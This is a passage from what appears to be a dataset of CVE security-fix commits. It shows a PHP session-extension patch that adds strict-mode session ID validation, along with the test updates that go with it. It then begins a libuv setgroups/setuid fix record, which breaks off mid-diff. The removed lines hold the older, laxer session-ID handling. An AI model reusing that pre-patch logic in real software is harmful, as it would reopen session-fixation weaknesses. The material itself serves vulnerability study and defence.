php_session_create_id((void **)&data, newlen TSRMLS_CC);\n+\n+\treturn sid;\n+}\n+\n #endif\n \n \/*\ndiff --git a\/ext\/session\/php_session.h b\/ext\/session\/php_session.h\nindex b28c2b4..e8e79f0 100644\n--- a\/ext\/session\/php_session.h\n+++ b\/ext\/session\/php_session.h\n@@ -29,6 +29,9 @@\n \n #define PHP_SESSION_API 20020330\n \n+\/* To check php_session_valid_key()\/php_session_reset_id() *\/\n+#define PHP_SESSION_STRICT 1\n+\n #define PS_OPEN_ARGS void **mod_data, const char *save_path, const char *session_name TSRMLS_DC\n #define PS_CLOSE_ARGS void **mod_data TSRMLS_DC\n #define PS_READ_ARGS void **mod_data, const char *key, char **val, int *vallen TSRMLS_DC\n@@ -75,7 +78,7 @@ typedef struct ps_module_struct {\n \t#x, ps_open_##x, ps_close_##x, ps_read_##x, ps_write_##x, \\\n \t ps_delete_##x, ps_gc_##x, php_session_create_id\n \n-\/* SID enabled module handler definitions *\/\n+\/* SID creation enabled module handler definitions *\/\n #define PS_FUNCS_SID(x) \\\n \tPS_OPEN_FUNC(x); \\\n \tPS_CLOSE_FUNC(x); \\\n@@ -175,6 +178,8 @@ typedef struct _php_ps_globals {\n \tsmart_str rfc1867_name;    \/* session.upload_progress.name *\/\n \tlong rfc1867_freq;         \/* session.upload_progress.freq *\/\n \tdouble rfc1867_min_freq;   \/* session.upload_progress.min_freq *\/\n+\n+\tzend_bool use_strict_mode; \/* whether or not PHP accepts unknown session ids *\/\n } php_ps_globals;\n \n typedef php_ps_globals zend_ps_globals;\n@@ -230,6 +235,9 @@ PHPAPI void php_session_start(TSRMLS_D);\n PHPAPI ps_module *_php_find_ps_module(char *name TSRMLS_DC);\n PHPAPI const ps_serializer *_php_find_ps_serializer(char *name TSRMLS_DC);\n \n+PHPAPI int php_session_valid_key(const char *key);\n+PHPAPI void php_session_reset_id(TSRMLS_D);\n+\n #define PS_ADD_VARL(name,namelen) do {\t\t\t\t\t\t\t\t\t\t\\\n \tphp_add_session_var(name, namelen TSRMLS_CC);\t\t\t\t\t\t\t\\\n } while (0)\ndiff --git a\/ext\/session\/session.c b\/ext\/session\/session.c\nindex e992f31..d90b5c6 100644\n--- a\/ext\/session\/session.c\n+++ b\/ext\/session\/session.c\n@@ -86,6 +86,8 @@ zend_class_entry *php_session_id_iface_entry;\n \t\treturn FAILURE;\t\\\n \t}\n \n+static void php_session_send_cookie(TSRMLS_D);\n+\n \/* Dispatched by RINIT and by php_session_destroy *\/\n static inline void php_rinit_session_globals(TSRMLS_D) \/* {{{ *\/\n {\n@@ -126,7 +128,7 @@ static int php_session_destroy(TSRMLS_D) \/* {{{ *\/\n \t\treturn FAILURE;\n \t}\n \n-\tif (PS(mod)->s_destroy(&PS(mod_data), PS(id) TSRMLS_CC) == FAILURE) {\n+\tif (PS(id) && PS(mod)->s_destroy(&PS(mod_data), PS(id) TSRMLS_CC) == FAILURE) {\n \t\tretval = FAILURE;\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Session object destruction failed\");\n \t}\n@@ -428,17 +430,45 @@ PHPAPI char *php_session_create_id(PS_CREATE_SID_ARGS) \/* {{{ *\/\n }\n \/* }}} *\/\n \n-static void php_session_initialize(TSRMLS_D) \/* {{{ *\/\n+\/* Default session id char validation function allowed by ps_modules.\n+ * If you change the logic here, please also update the error message in\n+ * ps_modules appropriately *\/\n+PHPAPI int php_session_valid_key(const char *key) \/* {{{ *\/\n {\n-\tchar *val;\n-\tint vallen;\n+\tsize_t len;\n+\tconst char *p;\n+\tchar c;\n+\tint ret = SUCCESS;\n+\n+\tfor (p = key; (c = *p); p++) {\n+\t\t\/* valid characters are a..z,A..Z,0..9 *\/\n+\t\tif (!((c >= 'a' && c <= 'z')\n+\t\t\t\t|| (c >= 'A' && c <= 'Z')\n+\t\t\t\t|| (c >= '0' && c <= '9')\n+\t\t\t\t|| c == ','\n+\t\t\t\t|| c == '-')) {\n+\t\t\tret = FAILURE;\n+\t\t\tbreak;\n+\t\t}\n+\t}\n \n-\t\/* check session name for invalid characters *\/\n-\tif (PS(id) && strpbrk(PS(id), \"\\r\\n\\t <>'\\\"\\\\\")) {\n-\t\tefree(PS(id));\n-\t\tPS(id) = NULL;\n+\tlen = p - key;\n+\n+\t\/* Somewhat arbitrary length limit here, but should be way more than\n+\t   anyone needs and avoids file-level warnings later on if we exceed MAX_PATH *\/\n+\tif (len == 0 || len > 128) {\n+\t\tret = FAILURE;\n \t}\n \n+\treturn ret;\n+}\n+\/* }}} *\/\n+\n+static void php_session_initialize(TSRMLS_D) \/* {{{ *\/\n+{\n+\tchar *val = NULL;\n+\tint vallen;\n+\n \tif (!PS(mod)) {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_ERROR, \"No storage module chosen - failed to initialize session\");\n \t\treturn;\n@@ -452,28 +482,38 @@ static void php_session_initialize(TSRMLS_D) \/* {{{ *\/\n \n \t\/* If there is no ID, use session module to create one *\/\n \tif (!PS(id)) {\n-new_session:\n \t\tPS(id) = PS(mod)->s_create_sid(&PS(mod_data), NULL TSRMLS_CC);\n+\t\tif (!PS(id)) {\n+\t\t\tphp_error_docref(NULL TSRMLS_CC, E_ERROR, \"Failed to create session ID: %s (path: %s)\", PS(mod)->s_name, PS(save_path));\n+\t\t\treturn;\n+\t\t}\n \t\tif (PS(use_cookies)) {\n \t\t\tPS(send_cookie) = 1;\n \t\t}\n \t}\n \n+\tphp_session_reset_id(TSRMLS_C);\n+\tPS(session_status) = php_session_active;\n+\n \t\/* Read data *\/\n-\t\/* Question: if you create a SID here, should you also try to read data?\n-\t * I'm not sure, but while not doing so will remove one session operation\n-\t * it could prove usefull for those sites which wish to have \"default\"\n-\t * session information. *\/\n \tphp_session_track_init(TSRMLS_C);\n-\tPS(invalid_session_id) = 0;\n-\tif (PS(mod)->s_read(&PS(mod_data), PS(id), &val, &vallen TSRMLS_CC) == SUCCESS) {\n+\tif (PS(mod)->s_read(&PS(mod_data), PS(id), &val, &vallen TSRMLS_CC) == FAILURE) {\n+\t\t\/* Some broken save handler implementation returns FAILURE for non-existent session ID *\/\n+\t\t\/* It's better to rase error for this, but disabled error for better compatibility *\/\n+\t\t\/*\n+\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Failed to read session data: %s (path: %s)\", PS(mod)->s_name, PS(save_path));\n+\t\t*\/\n+\t}\n+\tif (val) {\n \t\tphp_session_decode(val, vallen TSRMLS_CC);\n \t\tefree(val);\n-\t} else if (PS(invalid_session_id)) { \/* address instances where the session read fails due to an invalid id *\/\n-\t\tPS(invalid_session_id) = 0;\n-\t\tefree(PS(id));\n-\t\tPS(id) = NULL;\n-\t\tgoto new_session;\n+\t}\n+\n+\tif (!PS(use_cookies) && PS(send_cookie)) {\n+\t\tif (PS(use_trans_sid) && !PS(use_only_cookies)) {\n+\t\t\tPS(apply_trans_sid) = 1;\n+\t\t}\n+\t\tPS(send_cookie) = 0;\n \t}\n }\n \/* }}} *\/\n@@ -748,6 +788,7 @@ PHP_INI_BEGIN()\n \tSTD_PHP_INI_BOOLEAN(\"session.cookie_httponly\",  \"\",          PHP_INI_ALL, OnUpdateBool,   cookie_httponly,    php_ps_globals,    ps_globals)\n \tSTD_PHP_INI_BOOLEAN(\"session.use_cookies\",      \"1\",         PHP_INI_ALL, OnUpdateBool,   use_cookies,        php_ps_globals,    ps_globals)\n \tSTD_PHP_INI_BOOLEAN(\"session.use_only_cookies\", \"1\",         PHP_INI_ALL, OnUpdateBool,   use_only_cookies,   php_ps_globals,    ps_globals)\n+\tSTD_PHP_INI_BOOLEAN(\"session.use_strict_mode\",  \"0\",         PHP_INI_ALL, OnUpdateBool,   use_strict_mode,    php_ps_globals,    ps_globals)\n \tSTD_PHP_INI_ENTRY(\"session.referer_check\",      \"\",          PHP_INI_ALL, OnUpdateString, extern_referer_chk, php_ps_globals,    ps_globals)\n #if HAVE_DEV_URANDOM\n \tSTD_PHP_INI_ENTRY(\"session.entropy_file\",       \"\/dev\/urandom\",          PHP_INI_ALL, OnUpdateString, entropy_file,       php_ps_globals,    ps_globals)\n@@ -1297,10 +1338,15 @@ PHPAPI const ps_serializer *_php_find_ps_serializer(char *name TSRMLS_DC) \/* {{{\n \t\tconvert_to_string((*ppid)); \\\n \t\tPS(id) = estrndup(Z_STRVAL_PP(ppid), Z_STRLEN_PP(ppid))\n \n-static void php_session_reset_id(TSRMLS_D) \/* {{{ *\/\n+PHPAPI void php_session_reset_id(TSRMLS_D) \/* {{{ *\/\n {\n \tint module_number = PS(module_number);\n \n+\tif (!PS(id)) {\n+\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Cannot set session ID - session ID is not initialized\");\n+\t\treturn;\n+\t}\n+\n \tif (PS(use_cookies) && PS(send_cookie)) {\n \t\tphp_session_send_cookie(TSRMLS_C);\n \t\tPS(send_cookie) = 0;\n@@ -1447,19 +1493,14 @@ PHPAPI void php_session_start(TSRMLS_D) \/* {{{ *\/\n \t\t}\n \t}\n \n-\tphp_session_initialize(TSRMLS_C);\n-\n-\tif (!PS(use_cookies) && PS(send_cookie)) {\n-\t\tif (PS(use_trans_sid) && !PS(use_only_cookies)) {\n-\t\t\tPS(apply_trans_sid) = 1;\n-\t\t}\n-\t\tPS(send_cookie) = 0;\n+\t\/* Finally check session id for dangarous characters\n+\t * Security note: session id may be embedded in HTML pages.*\/\n+\tif (PS(id) && strpbrk(PS(id), \"\\r\\n\\t <>'\\\"\\\\\")) {\n+\t\tefree(PS(id));\n+\t\tPS(id) = NULL;\n \t}\n \n-\tphp_session_reset_id(TSRMLS_C);\n-\n-\tPS(session_status) = php_session_active;\n-\n+\tphp_session_initialize(TSRMLS_C);\n \tphp_session_cache_limiter(TSRMLS_C);\n \n \tif ((PS(mod_data) || PS(mod_user_implemented)) && PS(gc_probability) > 0) {\n@@ -1775,9 +1816,9 @@ static PHP_FUNCTION(session_save_path)\n static PHP_FUNCTION(session_id)\n {\n \tchar *name = NULL;\n-\tint name_len;\n+\tint name_len, argc = ZEND_NUM_ARGS();\n \n-\tif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"|s\", &name, &name_len) == FAILURE) {\n+\tif (zend_parse_parameters(argc TSRMLS_CC, \"|s\", &name, &name_len) == FAILURE) {\n \t\treturn;\n \t}\n \n@@ -1788,6 +1829,9 @@ static PHP_FUNCTION(session_id)\n \t}\n \n \tif (name) {\n+\t\tif (PS(use_strict_mode) && argc) {\n+\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Set session ID while session.use_strict_mode is enabled\");\n+\t\t}\n \t\tif (PS(id)) {\n \t\t\tefree(PS(id));\n \t\t}\n@@ -1822,11 +1866,13 @@ static PHP_FUNCTION(session_regenerate_id)\n \t\t}\n \n \t\tPS(id) = PS(mod)->s_create_sid(&PS(mod_data), NULL TSRMLS_CC);\n-\n-\t\tPS(send_cookie) = 1;\n-\t\tphp_session_reset_id(TSRMLS_C);\n-\n-\t\tRETURN_TRUE;\n+\t\tif (PS(id)) {\n+\t\t\tPS(send_cookie) = 1;\n+\t\t\tphp_session_reset_id(TSRMLS_C);\n+\t\t\tRETURN_TRUE;\n+\t\t} else {\n+\t\t\tPS(id) = STR_EMPTY_ALLOC();\n+\t\t}\n \t}\n \tRETURN_FALSE;\n }\ndiff --git a\/ext\/session\/tests\/003.phpt b\/ext\/session\/tests\/003.phpt\nindex 03c3b95..8725f06 100644\n--- a\/ext\/session\/tests\/003.phpt\n+++ b\/ext\/session\/tests\/003.phpt\n@@ -4,6 +4,7 @@ session object deserialization\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/004.phpt b\/ext\/session\/tests\/004.phpt\nindex aeb2c8b..4547c65 100644\n--- a\/ext\/session\/tests\/004.phpt\n+++ b\/ext\/session\/tests\/004.phpt\n@@ -4,6 +4,7 @@ session_set_save_handler test\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.name=PHPSESSID\n session.serialize_handler=php\ndiff --git a\/ext\/session\/tests\/005.phpt b\/ext\/session\/tests\/005.phpt\nindex a970e6b..796d9c3 100644\n--- a\/ext\/session\/tests\/005.phpt\n+++ b\/ext\/session\/tests\/005.phpt\n@@ -4,6 +4,7 @@ custom save handler, multiple session_start()s, complex data structure test.\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.name=PHPSESSID\n session.serialize_handler=php\ndiff --git a\/ext\/session\/tests\/006.phpt b\/ext\/session\/tests\/006.phpt\nindex 03fca10..dba6894 100644\n--- a\/ext\/session\/tests\/006.phpt\n+++ b\/ext\/session\/tests\/006.phpt\n@@ -4,6 +4,7 @@ correct instantiation of references between variables in sessions\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/009.phpt b\/ext\/session\/tests\/009.phpt\nindex d73bc23..6d8d11c 100644\n--- a\/ext\/session\/tests\/009.phpt\n+++ b\/ext\/session\/tests\/009.phpt\n@@ -4,6 +4,7 @@ unset($_SESSION[\"name\"]); test\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/012.phpt b\/ext\/session\/tests\/012.phpt\nindex 8708011..c555d2c 100644\n--- a\/ext\/session\/tests\/012.phpt\n+++ b\/ext\/session\/tests\/012.phpt\n@@ -4,6 +4,7 @@ registering $_SESSION should not segfault\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/013.phpt b\/ext\/session\/tests\/013.phpt\nindex 8d0f284..32909eb 100644\n--- a\/ext\/session\/tests\/013.phpt\n+++ b\/ext\/session\/tests\/013.phpt\n@@ -4,6 +4,7 @@ redefining SID should not cause warnings\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/014.phpt b\/ext\/session\/tests\/014.phpt\nindex 73bc28e..cbf22b1 100644\n--- a\/ext\/session\/tests\/014.phpt\n+++ b\/ext\/session\/tests\/014.phpt\n@@ -5,6 +5,7 @@ a script should not be able to modify session.use_trans_sid\n --INI--\n session.use_trans_sid=0\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.name=PHPSESSID\n session.serialize_handler=php\ndiff --git a\/ext\/session\/tests\/015.phpt b\/ext\/session\/tests\/015.phpt\nindex 7d7b737..527b86b 100644\n--- a\/ext\/session\/tests\/015.phpt\n+++ b\/ext\/session\/tests\/015.phpt\n@@ -6,6 +6,7 @@ use_trans_sid should not affect SID\n session.use_trans_sid=1\n session.use_cookies=0\n session.use_only_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n arg_separator.output=&\n session.name=PHPSESSID\ndiff --git a\/ext\/session\/tests\/016.phpt b\/ext\/session\/tests\/016.phpt\nindex 8370329..0e368e2 100644\n--- a\/ext\/session\/tests\/016.phpt\n+++ b\/ext\/session\/tests\/016.phpt\n@@ -16,10 +16,11 @@ session.serialize_handler=php\n <?php\n error_reporting(E_ALL);\n \n-@session_start();\n+session_start();\n $HTTP_SESSION_VARS[\"test\"] = 1;\n-@session_write_close();\n+session_write_close();\n print \"I live\\n\";\n ?>\n---EXPECT--\n+--EXPECTF--\n+Warning: session_write_close(): Failed to write session data (files). Please verify that the current setting of session.save_path is correct (123;:\/really\\completely:::\/invalid;;,23123;213) in %s on line %d\n I live\ndiff --git a\/ext\/session\/tests\/018.phpt b\/ext\/session\/tests\/018.phpt\nindex def1f41..5ec132b 100644\n--- a\/ext\/session\/tests\/018.phpt\n+++ b\/ext\/session\/tests\/018.phpt\n@@ -5,6 +5,7 @@ rewriter correctly handles attribute names which contain dashes\n --INI--\n session.use_cookies=0\n session.use_only_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.use_trans_sid=1\n session.name=PHPSESSID\ndiff --git a\/ext\/session\/tests\/019.phpt b\/ext\/session\/tests\/019.phpt\nindex 3ee8ccd..0f06add 100644\n--- a\/ext\/session\/tests\/019.phpt\n+++ b\/ext\/session\/tests\/019.phpt\n@@ -4,6 +4,7 @@ serializing references test case using globals\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/020.phpt b\/ext\/session\/tests\/020.phpt\nindex 0141129..267e521 100644\n--- a\/ext\/session\/tests\/020.phpt\n+++ b\/ext\/session\/tests\/020.phpt\n@@ -5,6 +5,7 @@ rewriter uses arg_separator.output for modifying URLs\n --INI--\n session.use_cookies=0\n session.use_only_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.use_trans_sid=1\n arg_separator.output=\"&amp;\"\ndiff --git a\/ext\/session\/tests\/021.phpt b\/ext\/session\/tests\/021.phpt\nindex 1ad3c5d..e199972 100644\n--- a\/ext\/session\/tests\/021.phpt\n+++ b\/ext\/session\/tests\/021.phpt\n@@ -5,6 +5,7 @@ rewriter handles form and fieldset tags correctly\n --INI--\n session.use_cookies=0\n session.use_only_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.use_trans_sid=1\n url_rewriter.tags=\"a=href,area=href,frame=src,input=src,form=,fieldset=\"\ndiff --git a\/ext\/session\/tests\/023.phpt b\/ext\/session\/tests\/023.phpt\nindex 42b1e5b..592b4a8 100644\n--- a\/ext\/session\/tests\/023.phpt\n+++ b\/ext\/session\/tests\/023.phpt\n@@ -4,6 +4,7 @@ session object deserialization\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/024.phpt b\/ext\/session\/tests\/024.phpt\nindex 2ad2606..2b273e2 100644\n--- a\/ext\/session\/tests\/024.phpt\n+++ b\/ext\/session\/tests\/024.phpt\n@@ -4,6 +4,7 @@ session_set_save_handler test\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.name=PHPSESSID\n session.serialize_handler=php\ndiff --git a\/ext\/session\/tests\/025.phpt b\/ext\/session\/tests\/025.phpt\nindex 4fd095f..a9ad8fb 100644\n--- a\/ext\/session\/tests\/025.phpt\n+++ b\/ext\/session\/tests\/025.phpt\n@@ -4,6 +4,7 @@ custom save handler, multiple session_start()s, complex data structure test.\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.name=PHPSESSID\n session.serialize_handler=php\ndiff --git a\/ext\/session\/tests\/026.phpt b\/ext\/session\/tests\/026.phpt\nindex 06c135d..44f0ae0 100644\n--- a\/ext\/session\/tests\/026.phpt\n+++ b\/ext\/session\/tests\/026.phpt\n@@ -4,6 +4,7 @@ correct instantiation of references between variables in sessions\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/027.phpt b\/ext\/session\/tests\/027.phpt\nindex 600a992..6382852 100644\n--- a\/ext\/session\/tests\/027.phpt\n+++ b\/ext\/session\/tests\/027.phpt\n@@ -4,6 +4,7 @@ unset($_SESSION[\"name\"]); should work\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/030.phpt b\/ext\/session\/tests\/030.phpt\nindex 8d0f284..32909eb 100644\n--- a\/ext\/session\/tests\/030.phpt\n+++ b\/ext\/session\/tests\/030.phpt\n@@ -4,6 +4,7 @@ redefining SID should not cause warnings\n <?php include('skipif.inc'); ?>\n --INI--\n session.use_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.serialize_handler=php\n session.save_handler=files\ndiff --git a\/ext\/session\/tests\/bug41600.phpt b\/ext\/session\/tests\/bug41600.phpt\nindex 690347a..79d5e12 100644\n--- a\/ext\/session\/tests\/bug41600.phpt\n+++ b\/ext\/session\/tests\/bug41600.phpt\n@@ -5,6 +5,7 @@ Bug #41600 (url rewriter tags doesn't work with namespaced tags)\n --INI--\n session.use_cookies=0\n session.use_only_cookies=0\n+session.use_strict_mode=0\n session.cache_limiter=\n session.use_trans_sid=1\n arg_separator.output=\"&amp;\"\ndiff --git a\/ext\/session\/tests\/bug60634.phpt b\/ext\/session\/tests\/bug60634.phpt\nindex 2ec0c26..e2dfd15 100644\n--- a\/ext\/session\/tests\/bug60634.phpt\n+++ b\/ext\/session\/tests\/bug60634.phpt\n@@ -1,7 +1,5 @@\n --TEST--\n Bug #60634 (Segmentation fault when trying to die() in SessionHandler::write())\n---XFAIL--\n-Long term low priority bug, working on it\n --INI--\n session.save_path=\n session.name=PHPSESSID\n@@ -44,3 +42,4 @@ echo \"um, hi\\n\";\n ?>\n --EXPECTF--\n write: goodbye cruel world\n+close: goodbye cruel world\ndiff --git a\/ext\/session\/tests\/bug60634_error_1.phpt b\/ext\/session\/tests\/bug60634_error_1.phpt\nindex 3b6e394..e41592f 100644\n--- a\/ext\/session\/tests\/bug60634_error_1.phpt\n+++ b\/ext\/session\/tests\/bug60634_error_1.phpt\n@@ -1,7 +1,5 @@\n --TEST--\n Bug #60634 (Segmentation fault when trying to die() in SessionHandler::write()) - fatal error in write during exec\n---XFAIL--\n-Long term low priority bug, working on it\n --INI--\n session.save_path=\n session.name=PHPSESSID\n@@ -47,3 +45,4 @@ echo \"um, hi\\n\";\n write: goodbye cruel world\n \n Fatal error: Call to undefined function undefined_function() in %s on line %d\n+close: goodbye cruel world\ndiff --git a\/ext\/session\/tests\/bug60634_error_2.phpt b\/ext\/session\/tests\/bug60634_error_2.phpt\nindex 265fb30..7c50948 100644\n--- a\/ext\/session\/tests\/bug60634_error_2.phpt\n+++ b\/ext\/session\/tests\/bug60634_error_2.phpt\n@@ -1,7 +1,5 @@\n --TEST--\n Bug #60634 (Segmentation fault when trying to die() in SessionHandler::write()) - exception in write during exec\n---XFAIL--\n-Long term low priority bug, working on it\n --INI--\n session.save_path=\n session.name=PHPSESSID\n@@ -47,3 +45,8 @@ echo \"um, hi\\n\";\n write: goodbye cruel world\n \n Fatal error: Uncaught exception 'Exception' in %s\n+Stack trace:\n+#0 [internal function]: write('%s', '')\n+#1 %s(%d): session_write_close()\n+#2 {main}\n+  thrown in %s on line %d\ndiff --git a\/ext\/session\/tests\/bug60634_error_3.phpt b\/ext\/session\/tests\/bug60634_error_3.phpt\nindex b2004d6..4a508a4 100644\n--- a\/ext\/session\/tests\/bug60634_error_3.phpt\n+++ b\/ext\/session\/tests\/bug60634_error_3.phpt\n@@ -1,7 +1,5 @@\n --TEST--\n Bug #60634 (Segmentation fault when trying to die() in SessionHandler::write()) - fatal error in write after exec\n---XFAIL--\n-Long term low priority bug, working on it\n --INI--\n session.save_path=\n session.name=PHPSESSID\n@@ -46,3 +44,4 @@ session_start();\n write: goodbye cruel world\n \n Fatal error: Call to undefined function undefined_function() in %s on line %d\n+close: goodbye cruel world\ndiff --git a\/ext\/session\/tests\/bug60634_error_4.phpt b\/ext\/session\/tests\/bug60634_error_4.phpt\nindex 60bc0dc..f21d077 100644\n--- a\/ext\/session\/tests\/bug60634_error_4.phpt\n+++ b\/ext\/session\/tests\/bug60634_error_4.phpt\n@@ -1,7 +1,5 @@\n --TEST--\n Bug #60634 (Segmentation fault when trying to die() in SessionHandler::write()) - exception in write after exec\n---XFAIL--\n-Long term low priority bug, working on it\n --INI--\n session.save_path=\n session.name=PHPSESSID\n@@ -46,3 +44,8 @@ session_start();\n write: goodbye cruel world\n \n Fatal error: Uncaught exception 'Exception' in %s\n+Stack trace:\n+#0 [internal function]: write('%s', '')\n+#1 {main}\n+  thrown in %s on line %d\n+close: goodbye cruel world\ndiff --git a\/ext\/session\/tests\/rfc1867_sid_invalid.phpt b\/ext\/session\/tests\/rfc1867_sid_invalid.phpt\nindex b28a2e3..4dd8f1f 100644\n--- a\/ext\/session\/tests\/rfc1867_sid_invalid.phpt\n+++ b\/ext\/session\/tests\/rfc1867_sid_invalid.phpt\n@@ -46,6 +46,16 @@ session_destroy();\n ?>\n --EXPECTF--\n Warning: Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in Unknown on line 0\n+\n+Warning: Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in Unknown on line 0\n+\n+Warning: Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in Unknown on line 0\n+\n+Warning: Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in Unknown on line 0\n+\n+Warning: Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in Unknown on line 0\n+\n+Warning: Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in Unknown on line 0\n string(%d) \"%s\"\n bool(true)\n array(2) {\ndiff --git a\/ext\/session\/tests\/session_commit_variation4.phpt b\/ext\/session\/tests\/session_commit_variation4.phpt\nindex 57f4253..69854a6 100644\n--- a\/ext\/session\/tests\/session_commit_variation4.phpt\n+++ b\/ext\/session\/tests\/session_commit_variation4.phpt\n@@ -2,6 +2,8 @@\n Test session_commit() function : variation\n --SKIPIF--\n <?php include('skipif.inc'); ?>\n+--INI--\n+session.use_strict_mode=0\n --FILE--\n <?php\n \ndiff --git a\/ext\/session\/tests\/session_save_path_variation2.phpt b\/ext\/session\/tests\/session_save_path_variation2.phpt\nindex 6b08480..dff0701 100644\n--- a\/ext\/session\/tests\/session_save_path_variation2.phpt\n+++ b\/ext\/session\/tests\/session_save_path_variation2.phpt\n@@ -32,7 +32,7 @@ ob_end_flush();\n *** Testing session_save_path() : variation ***\n string(5) \"\/blah\"\n \n-Warning: session_start(): open(%s, O_RDWR) failed: No such file or directory (2) in %s on line %d\n+Warning: session_start(): open(\/blah\/%s, O_RDWR) failed: No such file or directory (2) in %s on line %d\n bool(true)\n string(5) \"\/blah\"\n bool(true)\ndiff --git a\/ext\/session\/tests\/session_set_save_handler_error2.phpt b\/ext\/session\/tests\/session_set_save_handler_error2.phpt\nindex 03ba3b0..1f2a8b9 100644\n--- a\/ext\/session\/tests\/session_set_save_handler_error2.phpt\n+++ b\/ext\/session\/tests\/session_set_save_handler_error2.phpt\n@@ -2,6 +2,8 @@\n Test session_set_save_handler() function : error functionality\n --SKIPIF--\n <?php include('skipif.inc'); ?>\n+--INI--\n+error_reporting=0\n --FILE--\n <?php\n \ndiff --git a\/ext\/session\/tests\/session_set_save_handler_error3.phpt b\/ext\/session\/tests\/session_set_save_handler_error3.phpt\nindex 446ef7b..cb07b0d 100644\n--- a\/ext\/session\/tests\/session_set_save_handler_error3.phpt\n+++ b\/ext\/session\/tests\/session_set_save_handler_error3.phpt\n@@ -40,4 +40,3 @@ Stack trace:\n #1 %s(%d): session_start()\n #2 {main}\n   thrown in %s on line %d\n-\ndiff --git a\/ext\/session\/tests\/session_set_save_handler_error4.phpt b\/ext\/session\/tests\/session_set_save_handler_error4.phpt\nindex 4debde5..d286f07 100644\n--- a\/ext\/session\/tests\/session_set_save_handler_error4.phpt\n+++ b\/ext\/session\/tests\/session_set_save_handler_error4.phpt\n@@ -39,4 +39,3 @@ Warning: session_set_save_handler(): Argument 4 is not a valid callback in %s on\n Warning: session_set_save_handler(): Argument 5 is not a valid callback in %s on line %d\n \n Warning: session_set_save_handler(): Argument 6 is not a valid callback in %s on line %d\n-\ndiff --git a\/ext\/session\/tests\/session_write_close_variation4.phpt b\/ext\/session\/tests\/session_write_close_variation4.phpt\nindex 249c155..9076dcf 100644\n--- a\/ext\/session\/tests\/session_write_close_variation4.phpt\n+++ b\/ext\/session\/tests\/session_write_close_variation4.phpt\n@@ -2,6 +2,8 @@\n Test session_write_close() function : variation\n --SKIPIF--\n <?php include('skipif.inc'); ?>\n+--INI--\n+session.use_strict_mode=0\n --FILE--\n <?php\n \n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-0278","CWE_ID":"264","category":"security","commit_id":"66ab38918c911bcff025562cf06237d7fedaba0c","commit_message":"From 66ab38918c911bcff025562cf06237d7fedaba0c Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Sa=C3=BAl=20Ibarra=20Corretg=C3=A9?= <saghul@gmail.com>\nDate: Mon, 10 Feb 2014 17:41:51 +0100\nSubject: [PATCH] unix: call setgoups before calling setuid\/setgid\n\nPartial fix for #1093\n---\n src\/unix\/process.c | 11 +++++++++++\n 1 file changed, 11 insertions(+)\n\n","diff_code":"diff --git a\/src\/unix\/process.c b\/src\/unix\/process.c\nindex 0fc8f64019..1efd588b86 100644\n--- a\/src\/unix\/process.c\n+++ b\/src\/unix\/process.c\n@@ -330,6 +330,17 @@ static void uv__process_child_init(const uv_process_options_t* options,\n     _exit(127);\n   }\n \n+  if (options->flags & (UV_PROCESS_SETUID | UV_PROCESS_SETGID)) {\n+    